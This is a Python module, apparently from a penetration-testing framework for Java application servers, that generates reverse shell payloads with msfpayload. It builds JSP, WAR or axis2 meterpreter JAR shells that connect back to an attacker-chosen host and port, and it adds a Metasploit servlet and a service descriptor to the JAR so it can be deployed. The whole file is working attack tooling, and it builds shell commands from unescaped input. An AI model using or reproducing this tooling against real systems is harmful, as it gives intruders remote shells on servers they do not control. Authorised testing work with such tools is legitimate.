from commands import getoutput
from log import LOG
import utility
import os
from zipfile import ZipFile

def run(options):
    """ This module is used for generating reverse shell payloads.  It's not
    flexible in what sorts of payloads it can generate, but this is by design.

    Highly customized payloads, or stuff like meterpreter/reverse java payloads
    should be generated using proper tools, such as msfpayload.  This is merely
    a quick way for us to get a reverse shell on a remote system.
    """

    PAYLOAD = "java/jsp_shell_reverse_tcp"
    SHELL = "cmd.exe"

    if not options.remote_service:
        utility.Msg("Please specify a remote service (-a)", LOG.ERROR)
        return
    elif not options.remote_os:
        utility.Msg("Please specify a remote OS (-o)", LOG.ERROR)
        return
    elif options.remote_service in ["coldfusion"]:
        out = "R > shell.jsp"
    elif options.remote_service in ["axis2"]:
        PAYLOAD = "java/meterpreter/reverse_tcp"
        out = "R > shell.jar"
    else:
        out = "W > shell.war"

    if options.remote_os != "windows":
        SHELL = "/bin/bash"

    if getoutput("which msfpayload") == "":
        utility.Msg("This option requires msfpayload", LOG.ERROR)
        return

    utility.Msg("Generating payload....")
    (lhost, lport) = options.generate_payload.split(":")

    resp = getoutput("msfpayload %s LHOST=%s LPORT=%s SHELL=%s %s" %
                    (PAYLOAD, lhost, lport, SHELL, out))

    '''For axis2 payloads, we have to add a few things to the msfpayload output'''
    if(options.remote_service in ["axis2"]):
        services_xml="""<service name="shell" scope="application">
                            <description>
                                Clusterd axis2 service
                            </description>
                            <messageReceivers>
                                <messageReceiver
                                    mep="http://www.w3.org/2004/08/wsdl/in-only"
                                    class="org.apache.axis2.rpc.receivers.RPCInOnlyMessageReceiver"/>
                                <messageReceiver
                                    mep="http://www.w3.org/2004/08/wsdl/in-out"
                                    class="org.apache.axis2.rpc.receivers.RPCMessageReceiver"/>
                            </messageReceivers>
                            <parameter name="ServiceClass">
                                metasploit.PayloadServlet
                            </parameter>
                        </service>"""

        with ZipFile('shell.jar', 'a') as shellZip:
            shellZip.write("./src/lib/axis2/PayloadServlet.class","metasploit/PayloadServlet.class")
            shellZip.writestr("META-INF/services.xml",services_xml)

    if len(resp) <= 1 or 'Created by' in resp:
        utility.Msg("Payload generated (%s).  Payload: %s" % (out.split(' ')[2], PAYLOAD))

        # also log some auxiliary information
        getoutput("echo Generated at %s > ./src/lib/shell.log" % utility.timestamp())
        getoutput("echo %s:%s >> ./src/lib/shell.log" % (lhost, lport))
        getoutput("echo %s >> ./src/lib/shell.log" % (PAYLOAD))
    else:
        utility.Msg("Error generating payload: %s" % resp, LOG.ERROR)
